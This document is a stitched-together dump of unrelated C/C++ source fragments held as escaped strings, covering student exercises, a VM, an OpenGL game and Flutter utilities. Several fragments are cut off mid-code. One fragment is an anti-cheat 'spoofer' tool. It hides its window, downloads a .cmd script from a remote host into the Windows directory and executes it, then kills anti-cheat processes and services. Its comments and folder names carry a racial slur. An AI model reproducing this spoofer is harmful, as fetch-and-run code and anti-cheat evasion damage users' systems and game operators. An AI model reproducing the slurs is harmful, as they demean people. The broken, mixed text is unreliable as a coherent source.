size_t read = fread(p, sizeof(uint16_t), max_read, file);\n\n    /* swap to little endian */\n    while (read-- > 0)\n    {\n        *p = swap16(*p);\n        ++p;\n    }\n}\nint read_image(const char* image_path)\n{\n    FILE* file = fopen(image_path, \"rb\");\n    if (!file) { return 0; };\n    read_image_file(file);\n    fclose(file);\n    return 1;\n}\nvoid mem_write(uint16_t address, uint16_t val)\n{\n    memory[address] = val;\n}\nint unsigned_to_signed(uint16_t u)\n{\n    return (u + 32768) % 65536 - 32768;\n}\nuint16_t mem_read(uint16_t address)\n{\n    if (address == MR_KBSR)\n    {\n        if (check_key())\n        {\n            memory[MR_KBSR] = (1 << 15);\n            memory[MR_KBDR] = getchar();\n        }\n        else\n    ",
    "#include<iostream>\r\n#include<vector>\r\nusing namespace std;\r\nclass Persona{\r\n\tstring nombre;\r\n\tint edad;\r\n\tpublic:\r\n\t\tPersona();\r\n\t\tvoid setNombre(string nombre);\r\n\t\tvoid setEdad(int edad);\r\n\t\tstring getNombre();\r\n\t\tint getEdad();\r\n};\r\nPersona::Persona(){\r\n\tnombre=\"S/N\";\r\n\tedad=0;\r\n};\r\nvoid Persona::setNombre(string nombre){\r\n\tthis->nombre=nombre;\r\n};\r\nvoid Persona::setEdad(int edad){\r\n\tthis->edad=edad;\t\r\n};\r\nstring Persona::getNombre(){\r\n\treturn nombre;\r\n}\r\nint Persona::getEdad(){\r\n\treturn edad;\r\n};\r\nvoid mostrarDatos(vector<Persona> lista, string titulo);\r\nvoid ingresodatos(vector<Persona> &lista, int num);\r\nvoid buscarDatoBB(vector<Persona> lista, string nomBuscar);\r\nint main(){\r\n\tvector<Persona> lista;\r\n\t//Persona persona;\r\n\tint num=5;\r\n\tingresodatos(lista, num);\t\r\n\t//\r\n\t//mostrar datos\r\n\tmostrarDatos(lista,\"Lista inicial\");\r\n\t//buscar\r\n\tbuscarDatoBB(lista, \"b\");\r\n\treturn 0;\r\n}\r\nvoid mostrarDatos(vector<Persona> lista, string titulo){\r\n\tcout<<\"***** \"<<titulo<<\" *****\"<<endl;\r\n\tfor(auto i: lista){\r\n\t\tcout<<i.getNombre()<<\" \"<<i.getEdad()<<endl;\r\n\t};\t\r\n};\r\nvoid ingresodatos(vector<Persona> &lista, int num){\r\n\tPersona persona;\r\n\tstring nombre;\r\n\tint edad;\r\n\tfor(int i=1;i<=num;i++){\r\n\t\tcout<<\"Ingrese el nombre: \";\r\n\t\tgetline(cin>>ws,nombre);\r\n\t\tcout<<\"Ingrese la edad: \";\r\n\t\tcin>>edad;\r\n\t\t//guardar en el objeto\r\n\t\tpersona.setNombre(nombre);\r\n\t\tpersona.setEdad(edad);\r\n\t\t//guarda el objeto en el arreglo\r\n\t\tlista.push_back(persona);\r\n\t}\r\n};\r\nvoid buscarDatoBB(vector<Persona> lista, string nomBuscar){\r\n\tint inferior, superior, mitad;\r\n\tsuperior=lista.size();\r\n\tinferior=0;\r\n\tmitad=(superior+inferior)/2;\r\n\twhile(inferior<=superior && lista[mitad].getNombre()!=nomBuscar){\r\n\t\tif(nomBuscar<lista[mitad].getNombre()){\r\n\t\t\tsuperior=mitad-1;\r\n\r\n\t\t}else{\r\n\t\t\tinferior=mitad+1;\r\n\t\t}\r\n\t\tmitad=(superior+inferior)/2;\r\n\t}\r\n\tif(lista[mitad].getNombre()==nomBuscar){\r\n\t\tcout<<\"Encontrado\\n\";\r\n\t}else{\r\n\t\tcout<<\"No Encontrado\\n\";\r\n\t}\t\r\n};",
    "#include <unistd.h>\n#include \"CacheManager.h\"\n#include \"TimerManager.h\"\n\nextern thread_local size_t _threadId;\n\nTimerManager::TimerManager(size_t qSize,int initSec, int peridocSec)\n:_timerfd(createTimerFd())\n,_isExit(false)\n,_initSec(initSec)\n,_peridocSec(peridocSec)\n,_taskQ(qSize)\n{}\n\nvoid TimerManager::start() {\n    setTimer(_initSec,_peridocSec);\n    _pthread.reset(new thread(&TimerManager::doTask,this)); // \u521b\u5efa\u5b50\u7ebf\u7a0b\u6267\u884c\n}\n\nvoid TimerManager::stop() {\n    // \u505c\u6b62_timerfd\n    setTimer(0,0);\n    // \u4fdd\u8bc1\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5\n    while(!_taskQ.empty()){\n        sleep(1);\n    }\n    // \u4fee\u6539\u6807\u5fd7\u4f4d\n    _isExit = true;\n    // \u5524\u9192\u6240\u6709\u7ebf\u7a0b&\u56de\u6536\n    _taskQ.notify_all();\n    _pthread->join();\n}\n\nvoid TimerManager::addTask() {\n    // read timerfd,\u9632\u6b62timerfd\u4e00\u76f4\u5c31\u7eea\n    uint64_t two;\n    ssize_t ret = read(_timerfd, &two, sizeof(uint64_t));\n    if(ret != sizeof(uint64_t)){\n        LogError(\"read timerfd failed\");\n        return;\n    }\n    // \u6dfb\u52a0TimerTask\n    /* cout << \"addTask\\n\"; */\n    _taskQ.push(shared_ptr<TimerTask>(new TimerTask));\n}\n\nvoid TimerManager::doTask() {\n    /* cout << _threadId << \"\\n\"; */\n    while(!_isExit){\n        auto ptask = _taskQ.pop();\n        /* cout << \"do TimerTask\\n\"; */\n        if(ptask){\n            ptask->taskFunc();                                                                                                                         \n        }\n    }\n}\n\nvoid TimerManager::setTimer(int initSec, int peridocSec){\n    struct itimerspec value;\n    value.it_value.tv_sec = initSec;\n    value.it_value.tv_nsec = 0;\n\n    value.it_interval.tv_sec = peridocSec;\n    value.it_interval.tv_nsec = 0;\n\n    int ret = ::timerfd_settime(_timerfd, 0, &value, nullptr);\n    if(ret){\n        LogError(\"::timerfd_settime\");\n    }\n}\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"compiler.hpp\"\n#include <sstream>\n#include <regex>\n\nstd::vector<std::string> Compiler::compile(const std::string& code) {\n    std::vector<std::string> assembly;\n    std::istringstream iss(code);\n    std::string line;\n    while (getline(iss, line)) {\n        std::istringstream lineStream(line);\n        std::string command;\n        lineStream >> command;\n\n        if (command == \"input\") {\n            std::string var;\n            lineStream >> var;\n            symbolTable.add_symbol(var);\n            assembly.push_back(\"READ \" + std::to_string(symbolTable.get_address(var)));\n        }\n        else if (command == \"print\") {\n            std::string var;\n            lineStream >> var;\n            assembly.push_back(\"WRITE \" + std::to_string(symbolTable.get_address(var)));\n        }\n        else if (command == \"let\") {\n            std::string var, equals, operand1, op, operand2;\n            lineStream >> var >> equals >> operand1 >> op >> operand2;\n            if (op == \"+\") {\n                assembly.push_back(\"LOAD \" + std::to_string(symbolTable.get_address(operand1)));\n                if (std::regex_match(operand2, std::regex(\"[0-9]+\"))) { // Check if operand2 is a number...\n                    // Since the memory is limited, handling for constants directly isn't supported, simulate with temporary......\n                    assembly.push_back(\"ADD #\" + operand2); // will assume ADD #num is a valid for adding immediate values\n                }\n                else {\n                    assembly.push_back(\"ADD \" + std::to_string(symbolTable.get_address(operand2)));\n                }\n                assembly.push_back(\"STORE \" + std::to_string(symbolTable.get_address(var)));\n            }\n        }\n        else if (command == \"end\") {\n            assembly.push_back(\"HALT 0\");\n        }\n    }\n    return assembly;\n}\n",
    "/*\r\nSubject: DSA Laboratory\r\nPractical No: 11\r\nTitle: A C++ Program to i a Sequential Access file to maintain the data.\r\n Write data to file.\r\n Read data from file Sequentially.\r\n*/\r\n\r\n#include <iostream>\r\n#include <fstream>\r\nusing namespace std;\r\n\r\nclass student\r\n{\r\n\r\n\tint roll_no;\r\n\tchar Name[30];\r\n\tchar Division[5];\r\n\tchar Address[50];\r\n\t\r\n\r\npublic:\r\n\tvoid accept();\r\n\tvoid display();\r\n\tint rollno()\r\n\t{\r\n\t\treturn roll_no;\r\n\t}\r\n\t\r\n};\r\n\r\n\r\nvoid student::accept()\r\n{\r\n\tcout<<\"\\nEnter Roll Number: \";\r\n\tcin>>roll_no;\r\n\r\n\tcout<<\"\\nEnter Name: \";\r\n\tcin.ignore();\r\n\tcin.getline(Name,30);\r\n\t\r\n\tcout<<\"\\nEnter Division: \";\r\n\tcin>>Division;\r\n\t\r\n\tcout<<\"\\nEnter Address: \";\r\n\tcin>>Address;\r\n\r\n\tcout<<\"\\n\";\r\n}\r\n\r\n\r\nvoid student::display()\r\n{\r\n\tcout<<\"\\n    \"<<roll_no<<\"\\t  \"<<Name<<\"  \\t\\t \"<<Division<<\"\\t      \"<<Address;\r\n}\r\n\r\n\r\nvoid create()\r\n{\r\n\tstudent s;\r\n\tint n, i;\r\n\r\n\tofstream out(\"Student.txt\");\r\n\tcout<<\"\\nHow many records do you want to enter?: \";\r\n\tcin>>n;\r\n\r\n\tfor(i=0;i<n;i++)\r\n\t{\r\n\t\ts.accept();\r\n\t\tout.write((char *)&s,sizeof(s));\r\n\t}\r\n\r\n\tout.close();\r\n}\r\n\r\n\r\n\r\nvoid search()\r\n{\r\n\tint n, flag=0;\r\n\r\n\tcout<<\"\\nEnter Roll Number To Be Searched: \";\r\n\tcin>>n;\r\n\tifstream infile(\"Student.txt\");\r\n\r\n\tstudent s;\r\n\twhile(infile.read((char *)&s,sizeof(s)))\r\n\t{\r\n\t\tif(s.rollno()==n)\r\n\t\t{\r\n\t\t\tcout<<\"\\nRecord Found\\n\";\r\n\t\t\tcout<<\"\\nRoll Number          Name                      Division         Address\";\r\n\t\t\ts.display();\r\n\t\t\tflag=1;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\tif(flag==0)\r\n\t{\r\n\t\tcout<<\"\\nRecord Not Found.\";\r\n\t}\r\n\r\n\tinfile.close();\r\n}\r\n\r\n\r\n\r\nvoid display()\r\n{\r\n\tstudent s;\r\n\tifstream infile(\"Student.txt\");\r\n\twhile(infile.read((char *)&s, sizeof(s)))\r\n\t{\r\n\t\ts.display();\r\n\t}\r\n\r\n\tinfile.close();\r\n}\r\n\r\n\r\nvoid add_record()\r\n{\r\n\tstudent s;\r\n\tofstream outfile(\"Student.txt\",ios::app);\r\n\ts.accept();\r\n\toutfile.write((char *)&s,sizeof(s));\r\n\toutfile.close();\r\n\tcout<<\"Record Successfully Added.\";\r\n}\r\n\r\n\r\n\r\n\r\nvoid delete_record()\r\n{\r\n\tint n, flag=0;\r\n\tcout<<\"\\nEnter Roll Number Whose Record To Be Deleted:\";\r\n\tcin>>n;\r\n\tifstream infile(\"student.txt\"); // to read from source file\r\n\tofstream temp(\"temp.txt\"); // to write in destination file(temporary file)\r\n\tstudent s;\r\n\twhile(infile.read((char *)&s, sizeof(s)))\r\n\t{\r\n\t\tif(s.rollno()!=n)\r\n\t\t{\r\n\t\t\ttemp.write((char *)&s, sizeof(s));\r\n\t\t}\r\n\r\n\t\telse\r\n\t\t{\r\n\t\t\tflag=1;\r\n\t\t\tcout<<\"\\nRecord Successfully Deleted.\";\r\n\t\t}\r\n\t}\r\n\r\n\t\tif(flag==0)\r\n\t\t{\r\n\t\t\tcout<<\"\\nRecord Not Found.\";\r\n\t\t}\r\n\r\n\t\tinfile.close();\r\n\t\ttemp.close();\r\n\t\tremove(\"Student.txt\");\r\n\t\trename(\"temp.txt\",\"Student.txt\");\r\n}\r\n\r\n\r\n\r\nint main()\r\n{\r\n\tint choice;\r\n\tofstream out(\"Student.txt\");\r\n\tout.close();\r\n\tdo\r\n\t{   cout<<\"\\n\";\r\n\t\tcout<<\"\\nMenu:\\n1) Create Database.\\n2) Display.\\n3) Add record.\\n4) Search Record.\\n5)Delete Record.\\n6) Exit.\";\r\n\t\tcout<<\"\\n\\nEnter Your Choice:  \";\r\n\t\tcin>>choice;\r\n\r\n\t\tswitch(choice)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\tcout<<\"\\n\";\r\n\t\t\t\tcreate();\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase 2:\r\n\t\t\t\tcout<<\"\\n\";\r\n\t\t\t\tcout<<\"\\nRoll Number          Name                      Division         Address\";\r\n\t\t\t\tdisplay();\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase 3:\r\n\t\t\t\tcout<<\"\\n\";\r\n\t\t\t\tadd_record();\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase 4:\r\n\t\t\t\tcout<<\"\\n\";\r\n\t\t\t\tsearch();\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\tcase 5:\r\n\t\t\t\tcout<<\"\\n\";\r\n\t\t\t\tdelete_record();\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase 6:\r\n\t\t\t\tcout<<\"\\n\";\r\n\t\t\t\tcout<<\"You Have Successfully Exitted...\";\r\n\t\t\t\tbreak;\r\n\t\t} \r\n\t}\r\n\twhile(choice!=6);\r\n\r\n\treturn 0;\r\n}\r\n/*\r\n***********************OUTPUT******************************************\r\nMenu:\r\n1) Create Database.\r\n2) Display.\r\n3) Add record.\r\n4) Search Record.\r\n5)Delete Record.\r\n6) Exit.\r\n\r\nEnter Your Choice:  1\r\n\r\n\r\nHow many records do you want to enter?: 2\r\n\r\nEnter Roll Number: 65\r\n\r\nEnter Name: SIYA\r\n\r\nEnter Division: A\r\n\r\nEnter Address: NASHIK\r\n\r\n\r\nEnter Roll Number: 50\r\n\r\nEnter Name: KHUSHI\r\n\r\nEnter Division: A\r\n\r\nEnter Address: NASHIK\r\n*/\r\n\r\n\r\n",
    "//C++ Standard Template\r\n#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <fstream>\r\n#include <cmath>\r\n\r\n//Third Party\r\n#include <glad/glad.h>\r\n#include <GLFW/glfw3.h>\r\n#include <SDL/SDL.h>\r\n#include <glm/vec3.hpp> // glm::vec3\r\n#include <glm/vec4.hpp> // glm::vec4\r\n#include <glm/mat4x4.hpp> // glm::mat4\r\n//#include <glm/ext/matrix_transform.hpp> // glm::translate, glm::rotate, glm::scale\r\n#include <glm/ext/matrix_clip_space.hpp> // glm::perspective\r\n#include <glm/ext/scalar_constants.hpp> // glm::pi\r\n#include <glm/gtc/matrix_transform.hpp>\r\n#define GLM_ENABLE_EXPERIMENTAL\r\n#include <glm/gtx/string_cast.hpp>\r\n\r\n//GLOBAL VARIABLES\r\nint gScreenWidth = 1000;\r\nint gScreenHeight = 1000;\r\nSDL_Window*\t\tgGraphicsApplicationWindow = nullptr;\r\nSDL_GLContext\tgOpenGLContext = nullptr;\r\n\r\nbool gQuit = false; //If true, quit\r\n\r\n\r\n//VAO (stores attributes)\r\nGLuint gVertexArrayObject = 0;\r\n\r\n//VBO (stores data) - accessed by VAO\r\nGLuint gVertexBufferObject = 0;\r\n\r\n//Index Buffer Object (IBO)\r\nGLuint gIndexBufferObject = 0;\r\n\r\n//Program object for shaders\r\nGLuint gGraphicsPipelineShaderProgram = 0;\r\n\r\n//Movement variables for Quads\r\nfloat g_uOffset = 0.0f;\r\nfloat g_uOffsetQuad1 = -0.7f;\r\nfloat g_uOffsetQuad5 = 0.0f;\r\nfloat g_uOffsetQuad6 = 0.0f;\r\nfloat g_uOffsetQuad7 = 0.0f;\r\n\r\n//Gravity Variables\r\nfloat g_vOffsetQuad1 = -0.75f;\r\nfloat g_vOffsetQuad5 = 0.0f;\r\nfloat g_vOffsetQuad6 = 0.0f;\r\nfloat g_vOffsetQuad7 = 0.0f;\r\nfloat gGravity = -0.00009999f;\r\nbool isCollide = false;\r\nbool isDivide = false;\r\nbool canJump = false;\r\n\r\n//Collision Struct\r\nstruct Collider {\r\n\tglm::vec2 position;\r\n\tglm::vec2 size;\r\n};\r\n\r\n//Vector to store Colliders\r\nstd::vector<Collider> colliders;\r\n\r\n\r\n//Defining Colliders\r\nCollider quad1Collider = { glm::vec2(0.09f, -0.09f), glm::vec2(0.09f, -0.11f) }; //Character\r\nCollider quad2Collider = { glm::vec2(-0.9f, -0.9f), glm::vec2(1.8f, 0.19f) }; // Floor\r\nCollider quad3Collider = { glm::vec2(-0.9f, -0.8f), glm::vec2(0.19f, 1.8f) }; // Left Wall\r\nCollider quad4Collider = { glm::vec2(0.8f, -0.8f), glm::vec2(0.09f, 1.8f) };  // Right Wall\r\nCollider quad5Collider = { glm::vec2(-0.02f, 0.2f), glm::vec2(0.02f, 1.5f) };  // Middle Divider\r\nCollider quad6Collider;\r\nCollider quad7Collider;\r\n\r\n\r\n\r\n\r\nstd::string LoadShaderAsString(const std::string& filename) {\r\n\r\n\t//shader program loaded as single string. Dont want to compile everytime\r\n\tstd::string result = \"\"; \r\n\r\n\tstd::string line = \"\";\r\n\tstd::ifstream myFile(filename.c_str());\r\n\r\n\tif (myFile.is_open()) {\r\n\t\twhile (std::getline(myFile, line)) {\r\n\t\t\tresult += line + '\\n';\r\n\t\t}\r\n\t\tmyFile.close();\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\nGLuint CompileShader(GLuint type, const std::string& source) {\r\n\tGLuint shaderObject{};\r\n\r\n\t//for error checking\r\n\tif (type == GL_VERTEX_SHADER) {\r\n\t\tshaderObject = glCreateShader(GL_VERTEX_SHADER);\r\n\t}\r\n\telse if (type == GL_FRAGMENT_SHADER) {\r\n\t\tshaderObject = glCreateShader(GL_FRAGMENT_SHADER);\r\n\t}\r\n\r\n\tconst char* src = source.c_str();\r\n\tglShaderSource(shaderObject, 1, &src, nullptr);\r\n\tglCompileShader(shaderObject);\r\n\r\n\treturn shaderObject;\r\n}\r\n\r\nGLuint CreateShaderProgram(const std::string& vertexshadersource, const std::string& fragmentshadersource) {\r\n\tGLuint programObject = glCreateProgram();\r\n\r\n\tGLuint myVertexShader = CompileShader(GL_VERTEX_SHADER, vertexshadersource);\r\n\tGLuint myFragmentShader = CompileShader(GL_FRAGMENT_SHADER, fragmentshadersource);\r\n\r\n\tglAttachShader(programObject, myVertexShader);\r\n\tglAttachShader(programObject, myFragmentShader);\r\n\tglLinkProgram(programObject);\r\n\r\n\t//validate program\r\n\tglValidateProgram(programObject);\r\n\r\n\treturn programObject;\r\n}\r\n\r\nvoid CreateGraphicsPipeline() {\r\n\r\n\tstd::string vertexShaderSource = LoadShaderAsString(\"./vert.glsl\");\r\n\tstd::string fragmentShaderSource = LoadShaderAsString(\"./frag.glsl\");\r\n\r\n\tgGraphicsPipelineShaderProgram = CreateShaderProgram(vertexShaderSource, fragmentShaderSource);\r\n\r\n}\r\n\r\nvoid GetOpenGLVersionInfo() {\r\n\tstd::cout << \"Vendor: \" << glGetString(GL_VENDOR) << std::endl;\r\n\tstd::cout << \"Renderer \" << glGetString(GL_RENDERER) << std::endl;\r\n\tstd::cout << \"Version: \" << glGetString(GL_VERSION) << std::endl;\r\n\tstd::cout << \"Shading Language: \" << glGetString(GL_SHADING_LANGUAGE_VERSION) << std::endl;\r\n}\r\n\r\nvoid VertexSpecification(std::vector<GLfloat> &vertexData) {\r\n\r\n\t//Lives on the CPU\r\n\tvertexData = \r\n\t{\r\n\t\t //x      y      z\r\n\t\t // Quad 1 (Character)\r\n\t\t //0 - Vertex\r\n\t\t-0.09f,-0.09f, 0.0f,    //Left vertex\r\n\t\t 1.0f, 0.0f, 0.0f,     //Color\r\n\t\t //1 - Vertex\r\n\t\t 0.09f, -0.09f, 0.0f,    //Right vertex \r\n\t\t 0.0f, 1.0f, 0.0f,     //Color\r\n\t\t //2 - Vertex\r\n\t\t-0.09f, 0.09f, 0.0f,     //Top left vertex \r\n\t\t 0.0f, 0.0f, 1.0f,     //Color\r\n\t\t //3 - Vertex\r\n\t\t 0.09f, 0.09f, 0.0f,\t//Top right vertex\r\n\t\t 0.0f, 0.0f, 1.0f,     //Color\r\n\r\n\t\t //Quad 2 (Floor)\r\n\t\t//0 - Vertex\r\n\t\t-0.9f, -0.9f, 0.0f,    // Left vertex\r\n\t\t 0.0f, 0.0f, 0.0f,     // Color\r\n\t\t //1 - Vertex\r\n\t\t 0.9f, -0.9f, 0.0f,    // Right vertex \r\n\t\t 0.0f, 0.0f, 0.0f,     // Color\r\n\t\t //2 - Ver",
    "#include <Windows.h>\n#include \"auth/auth.hpp\"\n#include <string>\n#include \"auth/utils.hpp\"\n#include \"auth/skStr.h\"\n\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n#include <Windows.h>\n#include <Urlmon.h>\n\n#pragma comment(lib, \"Urlmon.lib\")\n\nnamespace fs = std::filesystem;\n\n#include <codecvt>\n\n#include <Windows.h>\n\nbool downloadFile(const std::wstring& url, const std::wstring& filePath) {\n    // nigger\n    int urlSize = WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, nullptr, 0, nullptr, nullptr);\n    int filePathSize = WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, nullptr, 0, nullptr, nullptr);\n\n    std::string narrowUrl(urlSize, '\\0');\n    std::string narrowFilePath(filePathSize, '\\0');\n\n    WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, narrowUrl.data(), urlSize, nullptr, nullptr);\n    WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, narrowFilePath.data(), filePathSize, nullptr, nullptr);\n\n    // nigger\n    HRESULT hr = URLDownloadToFileA(nullptr, narrowUrl.c_str(), narrowFilePath.c_str(), 0, nullptr);\n    if (FAILED(hr)) {\n        std::cerr << \"Failed to download files. Error code: \" << hr << std::endl;\n        return false;\n    }\n    return true;\n}\n\nvoid menu();\n\nint temp() {\n\n    INPUT input[2];\n\n    \n    input[0].type = INPUT_KEYBOARD;\n    input[0].ki.wScan = 0;\n    input[0].ki.time = 0;\n    input[0].ki.dwExtraInfo = 0;\n    input[0].ki.wVk = 0x31;  \n    input[0].ki.dwFlags = 0;  \n\n    \n    input[1].type = INPUT_KEYBOARD;\n    input[1].ki.wScan = 0;\n    input[1].ki.time = 0;\n    input[1].ki.dwExtraInfo = 0;\n    input[1].ki.wVk = 0x31;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n    \n    input[0].ki.wVk = VK_RETURN;  \n    input[0].ki.dwFlags = 0;      \n\n    \n    input[1].ki.wVk = VK_RETURN;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n}\n\nint win()\n{\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cdn.zerocdn.com/MAS_AIO-CRC32_9AE8AFBA%20%281%29.cmd\",\n    };\n\n    std::vector<std::wstring> fileNames = {\n        L\"windows.cmd\"\n    };\n\n    for (size_t i = 0; i < fileURLs.size(); ++i) {\n        if (!downloadFile(fileURLs[i], folderPath + fileNames[i])) {\n            std::wcerr << L\"Failed to download file: \" << fileURLs[i] << std::endl;\n            return 1;\n        }\n    }\n    _wsystem((folderPath + L\"windows.cmd\").c_str());\n\n    menu();\n}\nvoid tools()\n{\n    SetConsoleTitleA(\"Inertia TOOLS\");\n    system(\"cls\");\n    system(\"cls\");\n\n    printf(\"[ INFO ] Welcome to Inertia PERM SPOOFER\\n\\n\");\n    printf(\"\\n[1] Windows Activator \\n[2] MAC Spoof \\n[3] Return \\n[>] \");\n\n    std::string Spoof;\n    std::cin >> Spoof;\n\n    if (Spoof == \"1\" || Spoof == \"one\") {\n        \n        printf(\"[WARNING] THIS WILL CLOSE THE SPOOFER\");\n        Sleep(2000);\n        ShowWindow(GetConsoleWindow(), SW_HIDE);\n        win();\n        ShowWindow(GetConsoleWindow(), SW_SHOW);\n        printf(\"Done Spoofing...\");\n        Sleep(2000);\n    }\n    if (Spoof == \"2\" || Spoof == \"two\") {\n        printf(\"comign soon :)\");\n        tools();\n    }\n    if (Spoof == \"3\" || Spoof == \"three\") {\n        printf(\"Returning..\");\n        Sleep(2000);\n        menu();\n    }\n\n\n\n\n}\n\nvoid check()\n{\n    system(\"cls\");\n    system(\"echo BaseBoard:\");\n    Sleep(200);\n    system(\"wmic baseboard get serialnumber\");\n    Sleep(200);\n    system(\"echo System UUID:\") ;\n    Sleep(200);\n    system(\"wmic path win32_computersystemproduct get uuid\") ;\n    Sleep(200);\n    system(\"echo BIOS:\") ;\n    Sleep(200);\n    system(\"wmic bios get serialnumber\") ;\n    Sleep(200);\n    system(\"echo CPU:\") ;\n    Sleep(200);\n    system(\"wmic cpu get serialnumber\") ;\n    Sleep(200);\n    system(\"echo Mac Address:\") ;\n    Sleep(200);\n    system(\"getmac\") ;\n    Sleep(200);\n    std::cout << (\"  \")  << '\\n';\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(200);\n    system(\"echo Returning In 5 Seconds\");\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(5000);\n    system(\"cls\") ;\n    menu();\n}\n\n\n\nint spoof() {\n    system(\"taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BEService.exe >nul 2>&1\");\n    system(\"taskkill /F /IM Fortnite.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1\");\n    system(\"sc stop BEService >nul 2>&1\");\n    system(\"sc stop BEDaisy >nul 2>&1\");\n    system(\"sc stop EasyAntiCheat >nul 2>&1\");\n    system(\"sc stop EasyAntiCheatSys >nul 2>&1\");\n\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cd",
    "/* ************************************************************************** */\r\n/*                                                                            */\r\n/*                                                        :::      ::::::::   */\r\n/*   ft_itoa.cpp                                        :+:      :+:    :+:   */\r\n/*                                                    +:+ +:+         +:+     */\r\n/*   By: igeorge <igeorge@student.42lyon.fr>        +#+  +:+       +#+        */\r\n/*                                                +#+#+#+#+#+   +#+           */\r\n/*   Created: 2023/07/28 16:04:49 by igeorge           #+#    #+#             */\r\n/*   Updated: 2023/07/28 16:04:49 by igeorge          ###   ########.fr       */\r\n/*                                                                            */\r\n/* ************************************************************************** */\r\n\r\n#include \"../../includes/tools/Tools.hpp\"\r\n\r\nstatic unsigned int\tft_size_result(unsigned int 